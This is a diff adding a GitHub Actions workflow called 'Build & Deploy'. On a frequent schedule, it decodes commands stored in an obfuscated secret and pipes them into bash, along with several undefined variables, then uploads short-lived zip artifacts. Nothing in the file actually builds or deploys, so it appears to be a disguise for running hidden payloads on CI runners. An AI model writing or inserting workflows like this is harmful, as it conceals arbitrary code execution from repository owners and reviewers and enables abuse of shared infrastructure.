@@ -1,0 +1,35 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '5 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          eyrz64: ${{ secrets.eyrz64 }}
+        run: |
+          printf '%s' "$eyrz64" | jq -r .pcmok388 | /bin/bash
+          echo $tsd4065 | jq -r .liquf25001 | /bin/bash
+          printf '%s' "$bvcch2" | jq -r .wpsv23674 | /bin/bash
+          echo $h50 | jq -r .tfj647 | /bin/bash
+          printf '%s' "$ina37" | jq -r .tjpqn2926 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: Yyym5W6e
+          path: "*.zip"
+          retention-days: 1
